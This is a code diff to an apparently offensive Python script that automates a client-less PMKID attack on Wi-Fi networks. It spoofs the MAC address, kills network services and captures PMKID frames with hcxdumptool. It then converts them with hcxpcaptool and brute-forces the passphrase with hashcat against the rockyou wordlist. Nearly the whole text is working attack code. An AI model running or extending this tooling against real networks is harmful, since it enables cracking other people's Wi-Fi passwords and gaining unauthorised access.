@@ -71,6 +71,8 @@ def attack_func(network_interface, attack_mode):
     subprocess.run(["sudo", "ifconfig", network_interface + "mon", "down"])
     subprocess.run(["sudo", "macchanger", "-r", network_interface + "mon"])
     subprocess.run(["sudo", "ifconfig", network_interface + "mon", "up"])
+    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+    subprocess.run(["killall", "dhclient", "wpa_supplicant"])
     get_colours("\n New Mac Address Generated ", "blue")
     time.sleep(1)
     subprocess.run(["clear"])
@@ -103,22 +105,30 @@ def attack_func(network_interface, attack_mode):
         get_colours("Starting the PKMID Client-Less ATTACK", "magenta")
         time.sleep(3)
         get_colours("", "yellow")
-        subprocess.run(["timeout", "60", "hcxdumptool", "-i", network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
-        get_colours("\nGetting hashes", "magenta")
+        subprocess.run(["timeout", "60", "sudo", "hcxdumptool", "-i", network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
+        get_colours("\nClearing Temporary files..", "red")
         time.sleep(3)
-        
-
-def stop_attack(network_interface, attack_parm):
-    if attack_parm == "STOP":
-        get_colours("Stoping attack...", "red")
-        subprocess.run(["sudo", "airmon-ng", "stop", network_interface + "mon"])
-        get_colours("Network set to it's normal mode...", "magenta")
-        get_colours("[*] Exiting the program...", "blue")
+        get_colours("", "yellow")
+        subprocess.run(["clear"])
+        get_pkmid_hashes = subprocess.run(["sudo", "hcxpcaptool", "-z", "myHashes_PKMID", "Capture_PKMID"], capture_output=True, text=True)
+        print(get_pkmid_hashes.stdout)
+        get_colours("\nGetting hashes", "magenta")
+        subprocess.run(["rm", "Capture_PKMID"])
+        if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
+            get_colours("\nStarting with Brute-Force attack..", "cyan")
+            time.sleep(3)
+            get_colours("", "yellow")
+            subprocess.run(["sudo", "hashcat", "-m", "16800", "/usr/share/wordlists/rockyou.txt", "myHashes_PKMID", "-d", "1", "--force"])
+        else:
+            get_colours("\n No packet capture..", "red")
+            subprocess.run(["rm", "myHashes_PKMID*"])
 
 
 def ctrl_c(signum, frame):
+    get_colours("\nStopping attack...", "red")
     subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"])
-    get_colours("[*] Exiting the program...", "blue")
+    get_colours("Network set to it's normal mode...", "magenta")
+    get_colours("\n[*] Exiting the program...", "blue")
     exit(1)
 
 
